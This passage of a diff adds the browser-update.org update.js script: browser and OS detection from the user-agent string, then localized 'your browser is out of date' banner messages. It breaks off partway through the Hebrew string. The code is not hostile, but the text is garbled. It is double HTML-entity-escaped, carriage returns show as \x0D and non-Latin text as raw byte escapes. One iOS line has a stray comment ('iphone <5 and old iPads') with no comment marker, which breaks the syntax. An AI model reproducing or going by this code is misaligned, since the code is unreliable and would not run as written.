+|         var v=Math.round(parseFloat(RegExp.$1)*10)/10;\x0D
+|     }\x0D
+| \x0D
+|     if (!n)\x0D
+|         return {n:&quot;x&quot;,v:0,t:(names[n]||&quot;unknown&quot;),mobile:mobile};\x0D
+| \x0D
+|     //do not notify old systems since there is no up-to-date browser available\x0D
+|     if (/windows.nt.5.0|windows.nt.4.0|windows.95|windows.98|os x 10.2|os x 10.3|os x 10.4|os x 10.5|os x 10.6|os x 10.7/i.test(ua))\x0D
+|         donotnotify=&quot;oldOS&quot;;\x0D
+| \x0D
+|     //iOS\x0D
+|     if (/iphone|ipod|ipad|ios/i.test(ua)) {\x0D
+|         ua.replace(&quot;_&quot;,&quot;.&quot;).match(new RegExp(&quot;OS.(\\d+\\.?\\d?)&quot;,&quot;i&quot;));//\x0D
+|         n=&quot;iOS&quot;;\x0D
+|         v=parseFloat(RegExp.$1);\x0D
+|         var h = Math.max(window.screen.height, window.screen.width);\x0D
+|         if (h&amp;lt;=480 || window.devicePixelRatio&amp;lt;2) iphone &amp;lt;5 and old iPads   (h&amp;gt;568 --&amp;gt;iphone 6+)\x0D
+|               return {n:&quot;s&quot;,v:v,t:&quot;iOS &quot;+v,donotnotify:&quot;iOS without upgrade path&quot;,mobile:mobile};\x0D
+|         return {n:&quot;s&quot;,v:v,t:&quot;iOS &quot;+v,donotnotify:false,mobile:mobile};//identify as safari\x0D
+|     }\x0D
+|     //check for android stock browser\x0D
+|     if (ua.indexOf('Android')&amp;gt;-1 &amp;amp;&amp;amp; n===&quot;s&quot;) {\x0D
+|         var ver=parseInt((/WebKit\/([0-9]+)/i.exec(ua) || 0)[1],10) || 2000;\x0D
+|         if (ver &amp;lt;= 534)\x0D
+|             return {n:&quot;a&quot;,v:ver,t:names[&quot;a&quot;],mob:true,donotnotify:donotnotify,mobile:mobile};\x0D
+|         //else\x0D
+|         //    return {n:n,v:v,t:names[n]+&quot; &quot;+v,donotnotify:&quot;mobile on android&quot;,mobile:mobile};\x0D
+|     }\x0D
+| \x0D
+|     //do not notify firefox ESR\x0D
+|     if (n==&quot;f&quot; &amp;amp;&amp;amp; (Math.round(v)==45 || Math.round(v)==52))\x0D
+|         donotnotify=&quot;ESR&quot;;\x0D
+| \x0D
+|     if (n==&quot;so&quot;) {\x0D
+|         v=4.0;\x0D
+|         n=&quot;s&quot;;\x0D
+|     }\x0D
+|     if (n==&quot;i&quot; &amp;amp;&amp;amp; v==7 &amp;amp;&amp;amp; window.XDomainRequest) {\x0D
+|         v=8;\x0D
+|     }\x0D
+|     if (n==&quot;io&quot;) {\x0D
+|         n=&quot;i&quot;;\x0D
+|         if (v&amp;gt;6) v=11;\x0D
+|         else if (v&amp;gt;5) v=10;\x0D
+|         else if (v&amp;gt;4) v=9;\x0D
+|         else if (v&amp;gt;3.1) v=8;\x0D
+|         else if (v&amp;gt;3) v=7;\x0D
+|         else v=9;\x0D
+|     }\x0D
+|     if (n==&quot;e&quot;) {\x0D
+|         return {n:&quot;i&quot;,v:v,t:(names[n]||&quot;unknown&quot;)+&quot; &quot;+v,donotnotify:donotnotify,mobile:mobile};\x0D
+|     }\x0D
+|     return {n:n,v:v,t:(names[n]||&quot;unknown&quot;)+&quot; &quot;+v,donotnotify:donotnotify,mobile:mobile};\x0D
+|       }\x0D
+| //(c)2017, MIT Style License &amp;lt;browser-update.org/LICENSE.txt&amp;gt;\x0D
+| //https://github.com/browser-update/browser-update/blob/master/update.js\x0D
+| //\x0D
+|   $buo = function(op, test) {\x0D
+|     var jsv = 24;\x0D
+|     var n = window.navigator;\x0D
+|     var b;\x0D
+|     var vsdefault = { i: 11, f: -4, o: -4, s: -2, n: 12, c: -4, a: 534, y: -1, v: -0.2 };\x0D
+|     var vsmin = { i: 11, f: 10, o: 20, s: 7, n: 12, c: 33};\x0D
+|     var vs = {x: 9999999};\x0D
+|     var akt = actualBrowserInclude;\x0D
+|     var vsakt = {};\x0D
+|     var ls = !!localStorage &amp;amp;&amp;amp; localStorage.getItem(&quot;browsercheck&quot;);\x0D
+|     if(ls !== null){\x0D
+|       if(ls === &quot;false&quot;)\x0D
+|         return;\x0D
+|       else if(typeof(ls) === &quot;string&quot;){\x0D
+|         try{\x0D
+|           ls = JSON.parse(ls);\x0D
+|         }catch(e){\x0D
+|           ls = false;\x0D
+|         }\x0D
+|       }\x0D
+|       if(ls !== false &amp;amp;&amp;amp; !!ls.l &amp;amp;&amp;amp; !!ls.b){\x0D
+|         $bu_show(ls.l,ls.b);\x0D
+|         return;\x0D
+|       }\x0D
+|     }\x0D
+|     akt = akt.current.desktop;\x0D
+|     this.op = op || {};\x0D
+| \x0D
+|         vsakt[&quot;c&quot;] = akt[&quot;c&quot;];\x0D
+|         vsakt[&quot;f&quot;] = akt[&quot;f&quot;];\x0D
+|         vsakt[&quot;i&quot;] = akt[&quot;i&quot;];\x0D
+|         vsakt[&quot;o&quot;] = akt[&quot;o&quot;];\x0D
+|         vsakt[&quot;s&quot;] = akt[&quot;s&quot;];\x0D
+|         vsakt[&quot;e&quot;] = akt[&quot;e&quot;];\x0D
+| \x0D
+|     for (b in vsdefault) {\x0D
+|       if (!vs[b]) vs[b] = vsdefault[b];\x0D
+|       if (vsakt[b] &amp;amp;&amp;amp; vs[b] &amp;gt;= vsakt[b]) vs[b] = vsakt[b] - 0.2;\x0D
+|       if (vsakt[b] &amp;amp;&amp;amp; vs[b] &amp;lt;0) vs[b] = vsakt[b] + vs[b];\x0D
+|       if (vsmin[b] &amp;amp;&amp;amp; vs[b] &amp;lt;vsmin[b]) vs[b] = vsmin[b];\x0D
+|     }\x0D
+| \x0D
+|     this.op.onshow = op.onshow || function(o) {};\x0D
+|     this.op.onclick = op.onclick || function(o) {};\x0D
+|     this.op.onclose = op.onclose || function(o) {};\x0D
+| \x0D
+|     var bb = $bu_getBrowser(test);\x0D
+|     if (!bb\x0D
+|       || !bb.n\x0D
+|       || (document.cookie.indexOf(&quot;browserupdateorg=pause&quot;) &amp;gt; -1 &amp;amp;&amp;amp; this.op.reminder &amp;gt; 0)\x0D
+|       || bb.v &amp;gt;= vs[bb.n]\x0D
+|       || (bb.mobile &amp;amp;&amp;amp; op.mobile === false)\x0D
+|      ){\x0D
+|                //!!test &amp;amp;&amp;amp; !!console &amp;amp;&amp;amp; console.log(&quot;Browser OK&quot;, bb, vs)\x0D
+|                       return;\x0D
+|     }\x0D
+| \x0D
+|     if (this.op.nomessage) {\x0D
+|       op.onshow(this.op);\x0D
+|       return;\x0D
+|     }\x0D
+|     var ll = op.l || (n.languages ? n.languages[0] : null) || n.language || n.browserLanguage || n.userLanguage || document.documentElement.getAttribute(&quot;lang&quot;) || &quot;en&quot;;\x0D
+|     ll = ll.replace(&quot;_&quot;,&quot;-&quot;).toLowerCase().substr(0,2);\x0D
+| \x0D
+|     $bu_show(ll, bb)\x0D
+| \x0D
+|   };\x0D
+|   function $bu_show(ll,bb){\x0D
+|     var t = {};\x0D
+|     t.en = '&amp;lt;b&amp;gt;Your web browser (%s) is out of date&amp;lt;/b&amp;gt;. For more security, comfort and the best experience on this site: &amp;lt;a%s&amp;gt;Update your browser&amp;lt;/a&amp;gt; &amp;lt;a%s&amp;gt;Ignore&amp;lt;/a&amp;gt;';\x0D
+|     t.de = '&amp;lt;b&amp;gt;Ihr Browser (%s) ist veraltet&amp;lt;/b&amp;gt;. Aktualisieren sie ihren Browser f\xC3\xBCr mehr Sicherheit, Komfort und die einwandfreie Nutzung dieser Webseite. &amp;lt;a%s&amp;gt;Browser aktualisieren&amp;lt;/a&amp;gt; &amp;lt;a%s&amp;gt;Ignorieren&amp;lt;/a&amp;gt;';\x0D
+|     t.it = '&amp;lt;b&amp;gt;Il tuo browser (%s) non \xC3\xA8 aggiornato&amp;lt;/b&amp;gt;. Ha delle falle di sicurezza e potrebbe non visualizzare correttamente le pagine di questo e altri siti. &amp;lt;a%s&amp;gt;Actualice su navegador&amp;lt;/a&amp;gt; &amp;lt;a%s&amp;gt;Chiudi&amp;lt;/a&amp;gt;';\x0D
+|     t.pl = 'Przegl\xC4\x85darka (%s), kt\xC3\xB3rej u\xC5\xBCywasz, jest przestarza\xC5\x82a. Posiada ona udokumentowane &amp;lt;b&amp;gt;luki bezpiecze\xC5\x84stwa, inne wady&amp;lt;/b&amp;gt; oraz &amp;lt;b&amp;gt;ograniczon\xC4\x85 funkcjonalno\xC5\x9B\xC4\x87&amp;lt;/b&amp;gt;. Tracisz mo\xC5\xBCliwo\xC5\x9B\xC4\x87 skorzystania z pe\xC5\x82ni mo\xC5\xBCliwo\xC5\x9Bci oferowanych przez niekt\xC3\xB3re strony internetowe. &amp;lt;a%s&amp;gt;Dowiedz si\xC4\x99 jak zaktualizowa\xC4\x87 swoj\xC4\x85 przegl\xC4\x85dark\xC4\x99&amp;lt;/a&amp;gt;.';\x0D
+|     t.es = '&amp;lt;b&amp;gt;Su navegador (%s) no est\xC3\xA1 actualizado&amp;lt;/b&amp;gt;. Tiene fallos de seguridad conocidos y podr\xC3\xADa no mostrar todas las caracter\xC3\xADsticas de este y otros sitios web. &amp;lt;a%s&amp;gt;Averig\xC3\xBCe c\xC3\xB3mo actualizar su navegador.&amp;lt;/a&amp;gt; &amp;lt;a%s&amp;gt;Cerrar&amp;lt;/a&amp;gt;';\x0D
+|     t.nl = 'Uw browser (%s) is &amp;lt;b&amp;gt;oud&amp;lt;/b&amp;gt;. Het heeft bekende &amp;lt;b&amp;gt;veiligheidsissues&amp;lt;/b&amp;gt; en kan &amp;lt;b&amp;gt;niet alle mogelijkheden&amp;lt;/b&amp;gt; weergeven van deze of andere websites. &amp;lt;a%s&amp;gt;Lees meer over hoe uw browser te upgraden&amp;lt;/a&amp;gt;';\x0D
+|     t.pt = '&amp;lt;b&amp;gt;Seu navegador (%s) est\xC3\xA1 desatualizado&amp;lt;/b&amp;gt;. Ele possui falhas de seguran\xC3\xA7a e pode apresentar problemas para exibir este e outros websites. &amp;lt;a%s&amp;gt;Veja como atualizar o seu navegador&amp;lt;/a&amp;gt; &amp;lt;a%s&amp;gt;Fechar&amp;lt;/a&amp;gt;';\x0D
+|     t.sl = 'Va\xC5\xA1 brskalnik (%s) je &amp;lt;b&amp;gt;zastarel&amp;lt;/b&amp;gt;. Ima ve\xC4\x8D &amp;lt;b&amp;gt;varnostnih pomankljivosti&amp;lt;/b&amp;gt; in morda &amp;lt;b&amp;gt;ne bo pravilno prikazal&amp;lt;/b&amp;gt; te ali drugih strani. &amp;lt;a%s&amp;gt;Poglejte kako lahko posodobite svoj brskalnik&amp;lt;/a&amp;gt;';\x0D
+|     t.ru = '\xD0\x92\xD0\xB0\xD1\x88 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD0\xB5\xD1\x80 (%s) &amp;lt;b&amp;gt;\xD1\x83\xD1\x81\xD1\x82\xD0\xB0\xD1\x80\xD0\xB5\xD0\xBB&amp;lt;/b&amp;gt;. \xD0\x9E\xD0\xBD \xD0\xB8\xD0\xBC\xD0\xB5\xD0\xB5\xD1\x82 &amp;lt;b&amp;gt;\xD1\x83\xD1\x8F\xD0\xB7\xD0\xB2\xD0\xB8\xD0\xBC\xD0\xBE\xD1\x81\xD1\x82\xD0\xB8 \xD0\xB2 \xD0\xB1\xD0\xB5\xD0\xB7\xD0\xBE\xD0\xBF\xD0\xB0\xD1\x81\xD0\xBD\xD0\xBE\xD1\x81\xD1\x82\xD0\xB8&amp;lt;/b&amp;gt; \xD0\xB8 \xD0\xBC\xD0\xBE\xD0\xB6\xD0\xB5\xD1\x82 &amp;lt;b&amp;gt;\xD0\xBD\xD0\xB5 \xD0\xBF\xD0\xBE\xD0\xBA\xD0\xB0\xD0\xB7\xD1\x8B\xD0\xB2\xD0\xB0\xD1\x82\xD1\x8C \xD0\xB2\xD1\x81\xD0\xB5 \xD0\xB2\xD0\xBE\xD0\xB7\xD0\xBC\xD0\xBE\xD0\xB6\xD0\xBD\xD0\xBE\xD1\x81\xD1\x82\xD0\xB8&amp;lt;/b&amp;gt; \xD0\xBD\xD0\xB0 \xD1\x8D\xD1\x82\xD0\xBE\xD0\xBC \xD0\xB8 \xD0\xB4\xD1\x80\xD1\x83\xD0\xB3\xD0\xB8\xD1\x85 \xD1\x81\xD0\xB0\xD0\xB9\xD1\x82\xD0\xB0\xD1\x85. &amp;lt;a%s&amp;gt;\xD0\xA3\xD0\xB7\xD0\xBD\xD0\xB0\xD0\xB9\xD1\x82\xD0\xB5, \xD0\xBA\xD0\xB0\xD0\xBA \xD0\xBE\xD0\xB1\xD0\xBD\xD0\xBE\xD0\xB2\xD0\xB8\xD1\x82\xD1\x8C \xD0\x92\xD0\xB0\xD1\x88 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD0\xB5\xD1\x80&amp;lt;/a&amp;gt;';\x0D
+|     t.id = 'Browser Anda (%s) sudah &amp;lt;b&amp;gt;kedaluarsa&amp;lt;/b&amp;gt;. Browser yang Anda pakai memiliki &amp;lt;b&amp;gt;kelemahan keamanan&amp;lt;/b&amp;gt; dan mungkin &amp;lt;b&amp;gt;tidak dapat menampilkan semua fitur&amp;lt;/b&amp;gt; dari situs Web ini dan lainnya. &amp;lt;a%s&amp;gt; Pelajari cara memperbarui browser Anda&amp;lt;/a&amp;gt;';\x0D
+|     t.uk = '\xD0\x92\xD0\xB0\xD1\x88 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD0\xB5\xD1\x80 (%s) &amp;lt;b&amp;gt;\xD0\xB7\xD0\xB0\xD1\x81\xD1\x82\xD0\xB0\xD1\x80\xD1\x96\xD0\xB2&amp;lt;/b&amp;gt;. \xD0\x92\xD1\x96\xD0\xBD &amp;lt;b&amp;gt;\xD1\x83\xD1\x80\xD0\xB0\xD0\xB7\xD0\xBB\xD0\xB8\xD0\xB2\xD0\xB8\xD0\xB9&amp;lt;/b&amp;gt; \xD0\xB9 \xD0\xBC\xD0\xBE\xD0\xB6\xD0\xB5 &amp;lt;b&amp;gt;\xD0\xBD\xD0\xB5 \xD0\xB2\xD1\x96\xD0\xB4\xD0\xBE\xD0\xB1\xD1\x80\xD0\xB0\xD0\xB6\xD0\xB0\xD1\x82\xD0\xB8 \xD0\xB2\xD1\x81\xD1\x96 \xD0\xBC\xD0\xBE\xD0\xB6\xD0\xBB\xD0\xB8\xD0\xB2\xD0\xBE\xD1\x81\xD1\x82\xD1\x96&amp;lt;/b&amp;gt; \xD0\xBD\xD0\xB0 \xD1\x86\xD1\x8C\xD0\xBE\xD0\xBC\xD1\x83 \xD0\xB9 \xD1\x96\xD0\xBD\xD1\x88\xD0\xB8\xD1\x85 \xD1\x81\xD0\xB0\xD0\xB9\xD1\x82\xD0\xB0\xD1\x85. &amp;lt;a%s&amp;gt;\xD0\x94\xD1\x96\xD0\xB7\xD0\xBD\xD0\xB0\xD0\xB9\xD1\x82\xD0\xB5\xD1\x81\xD1\x8C, \xD1\x8F\xD0\xBA \xD0\xBE\xD0\xBD\xD0\xBE\xD0\xB2\xD0\xB8\xD1\x82\xD0\xB8 \xD0\x92\xD0\xB0\xD1\x88 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD0\xB5\xD1\x80&amp;lt;/a&amp;gt;';\x0D
+|     t.ko = '\xEC\xA7\x80\xEA\xB8\x88 \xEC\x82\xAC\xEC\x9A\xA9\xED\x95\x98\xEA\xB3\xA0 \xEA\xB3\x84\xEC\x8B\xA0 \xEB\xB8\x8C\xEB\x9D\xBC\xEC\x9A\xB0\xEC\xA0\x80(%s)\xEB\x8A\x94 &amp;lt;b&amp;gt;\xEC\x98\xA4\xEB\x9E\x98\xEB\x90\x98\xEC\x97\x88\xEC\x8A\xB5\xEB\x8B\x88\xEB\x8B\xA4.&amp;lt;/b&amp;gt; \xEC\x95\x8C\xEB\xA0\xA4\xEC\xA7\x84 &amp;lt;b&amp;gt;\xEB\xB3\xB4\xEC\x95\x88 \xEC\xB7\xA8\xEC\x95\xBD\xEC\xA0\x90&amp;lt;/b&amp;gt;\xEC\x9D\xB4 \xEC\xA1\xB4\xEC\x9E\xAC\xED\x95\x98\xEB\xA9\xB0, \xEC\x83\x88\xEB\xA1\x9C\xEC\x9A\xB4 \xEC\x9B\xB9 \xEC\x82\xAC\xEC\x9D\xB4\xED\x8A\xB8\xEA\xB0\x80 &amp;lt;b&amp;gt;\xEA\xB9\xA8\xEC\xA0\xB8 \xEB\xB3\xB4\xEC\x9D\xBC \xEC\x88\x98\xEB\x8F\x84&amp;lt;/b&amp;gt; \xEC\x9E\x88\xEC\x8A\xB5\xEB\x8B\x88\xEB\x8B\xA4. &amp;lt;a%s&amp;gt;\xEB\xB8\x8C\xEB\x9D\xBC\xEC\x9A\xB0\xEC\xA0\x80\xEB\xA5\xBC \xEC\x96\xB4\xEB\x96\xBB\xEA\xB2\x8C \xEC\x97\x85\xEB\x8D\xB0\xEC\x9D\xB4\xED\x8A\xB8\xED\x95\x98\xEB\x82\x98\xEC\x9A\x94?&amp;lt;/a&amp;gt;';\x0D
+|     t.rm = 'Tes navigatur (%s) \xC3\xA8 &amp;lt;b&amp;gt;antiqu\xC3\xA0&amp;lt;/b&amp;gt;. El cuntegna &amp;lt;b&amp;gt;problems da segirezza&amp;lt;/b&amp;gt; enconuschents e mussa eventualmain &amp;lt;b&amp;gt;betg tut las funcziuns&amp;lt;/b&amp;gt; da questa ed autras websites. &amp;lt;a%s&amp;gt;Emprenda sco actualisar tes navigatur&amp;lt;/a&amp;gt;.';\x0D
+|     t.jp = '\xE3\x81\x8A\xE4\xBD\xBF\xE3\x81\x84\xE3\x81\xAE\xE3\x83\x96\xE3\x83\xA9\xE3\x82\xA6\xE3\x82\xB6\xE3\x80\x8C%s\xE3\x80\x8D\xE3\x81\xAF\xE3\x80\x81&amp;lt;b&amp;gt;\xE6\x99\x82\xE4\xBB\xA3\xE9\x81\x85\xE3\x82\x8C&amp;lt;/b&amp;gt;\xE3\x81\xAE\xE3\x83\x90\xE3\x83\xBC\xE3\x82\xB8\xE3\x83\xA7\xE3\x83\xB3\xE3\x81\xA7\xE3\x81\x99\xE3\x80\x82\xE6\x97\xA2\xE7\x9F\xA5\xE3\x81\xAE&amp;lt;b&amp;gt;\xE8\x84\x86\xE5\xBC\xB1\xE6\x80\xA7&amp;lt;/b&amp;gt;\xE3\x81\x8C\xE5\xAD\x98\xE5\x9C\xA8\xE3\x81\x99\xE3\x82\x8B\xE3\x81\xB0\xE3\x81\x8B\xE3\x82\x8A\xE3\x81\x8B\xE3\x80\x81&amp;lt;b&amp;gt;\xE6\xA9\x9F\xE8\x83\xBD\xE4\xB8\x8D\xE8\xB6\xB3&amp;lt;/b&amp;gt;\xE3\x81\xAB\xE3\x82\x88\xE3\x81\xA3\xE3\x81\xA6\xE3\x80\x81\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88\xE3\x81\x8C\xE6\xAD\xA3\xE5\xB8\xB8\xE3\x81\xAB\xE8\xA1\xA8\xE7\xA4\xBA\xE3\x81\xA7\xE3\x81\x8D\xE3\x81\xAA\xE3\x81\x84\xE5\x8F\xAF\xE8\x83\xBD\xE6\x80\xA7\xE3\x81\x8C\xE3\x81\x82\xE3\x82\x8A\xE3\x81\xBE\xE3\x81\x99\xE3\x80\x82 &amp;lt;a%s&amp;gt;\xE3\x83\x96\xE3\x83\xA9\xE3\x82\xA6\xE3\x82\xB6\xE3\x82\x92\xE6\x9B\xB4\xE6\x96\xB0\xE3\x81\x99\xE3\x82\x8B\xE6\x96\xB9\xE6\xB3\x95\xE3\x82\x92\xE7\xA2\xBA\xE8\xAA\x8D\xE3\x81\x99\xE3\x82\x8B&amp;lt;/a&amp;gt;';\x0D
+|     t.fr = '&amp;lt;b&amp;gt;Votre navigateur (%s) est p\xC3\xA9rim\xC3\xA9&amp;lt;/b&amp;gt;. Il contient des failles de s\xC3\xA9curit\xC3\xA9 et pourrait ne pas afficher certaines fonctionnalit\xC3\xA9s des sites internet r\xC3\xA9cents. &amp;lt;a%s&amp;gt;Mettre le navigateur \xC3\xA0 jour&amp;lt;/a&amp;gt; &amp;lt;a%s&amp;gt;Fermer&amp;lt;/a&amp;gt;';\x0D
+|     t.da = 'Din browser (%s) er &amp;lt;b&amp;gt;for&amp;amp;aelig;ldet&amp;lt;/b&amp;gt;. Den har kendte &amp;lt;b&amp;gt;sikkerhedshuller&amp;lt;/b&amp;gt; og kan m&amp;amp;aring;ske &amp;lt;b&amp;gt;ikke vise alle funktioner&amp;lt;/b&amp;gt; p&amp;amp;aring; dette og andre websteder. &amp;lt;a%s&amp;gt;Se hvordan du opdaterer din browser&amp;lt;/a&amp;gt;';\x0D
+|     t.sq = 'Shfletuesi juaj (%s) \xC3\xABsht\xC3\xAB &amp;lt;b&amp;gt;ca i vjet\xC3\xABr&amp;lt;/b&amp;gt;. Ai ka &amp;lt;b&amp;gt;t\xC3\xAB meta sigurie&amp;lt;/b&amp;gt; t\xC3\xAB njohura dhe mundet t\xC3\xAB &amp;lt;b&amp;gt;mos i shfaq\xC3\xAB t\xC3\xAB gjitha karakteristikat&amp;lt;/b&amp;gt; e k\xC3\xABsaj dhe shum\xC3\xAB faqeve web t\xC3\xAB tjera. &amp;lt;a%s&amp;gt;M\xC3\xABsoni se si t\xC3\xAB p\xC3\xABrdit\xC3\xABsoni shfletuesin tuaj&amp;lt;/a&amp;gt;';\x0D
+|     t.ca = 'El teu navegador (%s) est\xC3\xA0 &amp;lt;b&amp;gt;desactualitzat&amp;lt;/b&amp;gt;. T\xC3\xA9 &amp;lt;b&amp;gt;vulnerabilitats&amp;lt;/b&amp;gt; conegudes i pot &amp;lt;b&amp;gt;no mostrar totes les caracter\xC3\xADstiques&amp;lt;/b&amp;gt; d\'aquest i altres llocs web. &amp;lt;a%s&amp;gt;Apr\xC3\xA8n a actualitzar el navegador&amp;lt;/a&amp;gt;';\x0D
+|     t.fa = '\xD9\x85\xD8\xB1\xD9\x88\xD8\xB1\xDA\xAF\xD8\xB1 \xD8\xB4\xD9\x85\xD8\xA7 (%s) &amp;lt;b&amp;gt;\xD8\xA7\xD8\xB2 \xD8\xB1\xD8\xAF\xD9\x87 \xD8\xAE\xD8\xA7\xD8\xB1\xD8\xAC \xD8\xB4\xD8\xAF\xD9\x87&amp;lt;/b&amp;gt; \xD9\x85\xDB\x8C \xD8\xA8\xD8\xA7\xD8\xB4\xD8\xAF. \xD8\xA7\xDB\x8C\xD9\x86 \xD9\x85\xD8\xB1\xD9\x88\xD8\xB1\xDA\xAF\xD8\xB1 \xD8\xAF\xD8\xA7\xD8\xB1\xD8\xA7\xDB\x8C &amp;lt;b&amp;gt;\xD9\x85\xD8\xB4\xDA\xA9\xD9\x84\xD8\xA7\xD8\xAA \xD8\xA7\xD9\x85\xD9\x86\xDB\x8C\xD8\xAA\xDB\x8C \xD8\xB4\xD9\x86\xD8\xA7\xD8\xAE\xD8\xAA\xD9\x87 \xD8\xB4\xD8\xAF\xD9\x87&amp;lt;/b&amp;gt; \xD9\x85\xDB\x8C \xD8\xA8\xD8\xA7\xD8\xB4\xD8\xAF \xD9\x88 &amp;lt;b&amp;gt;\xD9\x86\xD9\x85\xDB\x8C \xD8\xAA\xD9\x88\xD8\xA7\xD9\x86\xD8\xAF \xD8\xAA\xD9\x85\xD8\xA7\xD9\x85\xDB\x8C \xD9\x88\xDB\x8C\xDA\x98\xDA\xAF\xDB\x8C \xD9\x87\xD8\xA7\xDB\x8C \xD8\xA7\xDB\x8C\xD9\x86&amp;lt;/b&amp;gt; \xD9\x88\xD8\xA8 \xD8\xB3\xD8\xA7\xDB\x8C\xD8\xAA \xD9\x88 \xD8\xAF\xDB\x8C\xDA\xAF\xD8\xB1 \xD9\x88\xD8\xA8 \xD8\xB3\xD8\xA7\xDB\x8C\xD8\xAA \xD9\x87\xD8\xA7 \xD8\xB1\xD8\xA7 \xD8\xA8\xD9\x87 \xD8\xAE\xD9\x88\xD8\xA8\xDB\x8C \xD9\x86\xD9\x85\xD8\xA7\xDB\x8C\xD8\xB4 \xD8\xAF\xD9\x87\xD8\xAF. &amp;lt;a%s&amp;gt;\xD8\xAF\xD8\xB1 \xD8\xAE\xD8\xB5\xD9\x88\xD8\xB5 \xDA\xAF\xD8\xB1\xD9\x81\xD8\xAA\xD9\x86 \xD8\xB1\xD8\xA7\xD9\x87\xD9\x86\xD9\x85\xD8\xA7\xDB\x8C\xDB\x8C \xD8\xAF\xD8\xB1\xD8\xAE\xD8\xB5\xD9\x88\xD8\xB5 \xD9\x86\xD8\xAD\xD9\x88\xD9\x87 \xDB\x8C \xD8\xA8\xD9\x87 \xD8\xB1\xD9\x88\xD8\xB2 \xD8\xB1\xD8\xB3\xD8\xA7\xD9\x86\xDB\x8C \xD9\x85\xD8\xB1\xD9\x88\xD8\xB1\xDA\xAF\xD8\xB1 \xD8\xAE\xD9\x88\xD8\xAF \xD8\xA7\xDB\x8C\xD9\x86\xD8\xAC\xD8\xA7 \xDA\xA9\xD9\x84\xDB\x8C\xDA\xA9 \xDA\xA9\xD9\x86\xDB\x8C\xD8\xAF.&amp;lt;/a&amp;gt;';\x0D
+|     t.sv = 'Din webbl\xC3\xA4sare (%s) \xC3\xA4r &amp;lt;b&amp;gt;f\xC3\xB6r\xC3\xA5ldrad&amp;lt;/b&amp;gt;. Den har k\xC3\xA4nda &amp;lt;b&amp;gt;s\xC3\xA4kerhetsh\xC3\xA5l&amp;lt;/b&amp;gt; och &amp;lt;b&amp;gt;kan inte visa alla funktioner korrekt&amp;lt;/b&amp;gt; p\xC3\xA5 denna och p\xC3\xA5 andra webbsidor. &amp;lt;a%s&amp;gt;Uppdatera din webbl\xC3\xA4sare idag&amp;lt;/a&amp;gt;';\x0D
+|     t.hu = 'Az \xC3\x96n b\xC3\xB6ng\xC3\xA9sz\xC5\x91je (%s) &amp;lt;b&amp;gt;elavult&amp;lt;/b&amp;gt;. Ismert &amp;lt;b&amp;gt;biztons\xC3\xA1gi hi\xC3\xA1nyoss\xC3\xA1gai&amp;lt;/b&amp;gt; vannak \xC3\xA9s esetlegesen &amp;lt;b&amp;gt;nem tud minden funkci\xC3\xB3t megjelen\xC3\xADteni&amp;lt;/b&amp;gt; ezen vagy m\xC3\xA1s weboldalakon. &amp;lt;a%s&amp;gt;Itt tal\xC3\xA1l b\xC5\x91vebb inform\xC3\xA1ci\xC3\xB3t a b\xC3\xB6ng\xC3\xA9sz\xC5\x91j\xC3\xA9nek friss\xC3\xADt\xC3\xA9s\xC3\xA9vel kapcsolatban&amp;lt;/a&amp;gt;     ';\x0D
+|     t.gl = 'O seu navegador (%s) est\xC3\xA1 &amp;lt;b&amp;gt;desactualizado&amp;lt;/b&amp;gt;. Ten co\xC3\xB1ecidos &amp;lt;b&amp;gt;fallos de seguranza&amp;lt;/b&amp;gt; e poder\xC3\xADa &amp;lt;b&amp;gt;non mostrar t\xC3\xB3dalas caracter\xC3\xADsticas&amp;lt;/b&amp;gt; deste e outros sitios web. &amp;lt;a%s&amp;gt;Aprenda como pode actualizar o seu navegador&amp;lt;/a&amp;gt;';\x0D
+|     t.cs = 'V\xC3\xA1\xC5\xA1 prohl\xC3\xAD\xC5\xBEe\xC4\x8D (%s) je &amp;lt;b&amp;gt;zastaral\xC3\xBD&amp;lt;/b&amp;gt;. Jsou zn\xC3\xA1my &amp;lt;b&amp;gt;bezpe\xC4\x8Dnostn\xC3\xAD rizika&amp;lt;/b&amp;gt; a mo\xC5\xBEn\xC3\xA1 &amp;lt;b&amp;gt;nedok\xC3\xA1\xC5\xBEe zobrazit v\xC5\xA1echny prvky&amp;lt;/b&amp;gt; t\xC3\xA9to a dal\xC5\xA1\xC3\xADch webov\xC3\xBDch str\xC3\xA1nek. &amp;lt;a%s&amp;gt;Nau\xC4\x8Dte se, jak aktualizovat sv\xC5\xAFj prohl\xC3\xAD\xC5\xBEe\xC4\x8D&amp;lt;/a&amp;gt;';\x0D
+|     t.he = '\xD7\x94\xD7\x93\xD7\xA4\xD7\x93\xD7\xA4\xD7\x9F \xD7\xA9\xD7\x9C\xD7\x9A (%s) &amp;lt;b&amp;gt;\xD7\x90\xD7\x99\xD7\xA0\xD7\x95 \xD7\x9E\xD7\xA2\xD7\x95\xD7\x93\xD7\x9B\xD7\x9F&amp;lt;/b&amp;gt;. \xD7\x99\xD7\xA9 \xD7\x9C\xD7\x95 &amp;lt;b&amp;gt;\xD7\x91\xD7\xA2\xD7\x99\xD7\x95\xD7\xAA \xD7\x90\xD7\x91\xD7\x98\xD7\x97\xD7\x94 \xD7\x99\xD7\x93\xD7\x95\xD7\xA2\xD7\x95\xD7\xAA&amp;lt;/b&amp;gt; \xD7\x95\xD7\xA2\xD7\xA9\xD7\x95\xD7\x99 &amp;lt;b&amp;gt;\xD7\x9C\xD7\x90 \xD7\x9C\xD7\x94\xD7\xA6\xD7\x99\xD7\x92 \xD7\x90\xD7\xAA \xD7\x9B\xD7\x9C \xD7\x94\xD7\xAA\xD7\x9B\xD7\x95\xD7\xA0\xD7\x95\xD7\xAA&amp;lt;/b&amp;gt; \xD7\xA9\xD7\x9C \xD7\x90\xD7\xAA\xD7\xA8 \xD7\x96\xD7\x94 \xD7\x95\xD7\x90\xD7\xAA\xD7\xA8\xD7\x99\xD7\x9D \xD7\x90\xD7\x97\xD7\xA8\xD7\x99\xD7\x9D. &amp;lt;a%s&amp;gt;\xD7\x9C\xD7\x9E\xD7\x93 \xD7\x9B\xD7\x99\xD7\xA6\xD7\x93 \xD7\x9C\xD7\xA2\xD7\x93\xD7\x9B\xD7\x9F \xD7\x90\xD7\xAA \xD7\x94\xD7\x93\xD7\xA4\xD7\x93\xD7\xA4\xD7\x9F 